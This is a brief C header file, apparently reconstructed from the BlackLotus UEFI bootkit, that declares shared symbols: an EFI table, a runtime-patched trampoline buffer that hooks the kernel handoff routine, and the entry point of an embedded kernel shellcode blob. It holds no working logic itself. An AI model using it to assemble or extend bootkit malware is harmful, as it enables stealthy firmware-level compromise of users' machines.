#pragma once

/*
 * Reconstructed Labels.h for BlackLotus Bootkit.
 * Declares the global symbols used across all bootkit translation units.
 */

#include "EfTbl.h"

/* The shared EFI table instance – defined in the final linked image */
extern EFTBL EfTbl;

/*
 * Callgate buffer – a small trampoline stub patched at runtime.
 * Size matches the longest OslArchTransferToKernel variant (16 + 14 bytes).
 */
extern UINT8 EfClg[32];

/*
 * KmEnt – entry point of the embedded kernel shellcode blob.
 * Defined in the linker script / assembly stub in the original project;
 * declared extern here so C translation units can reference it.
 */
extern UINT8 KmEnt[];
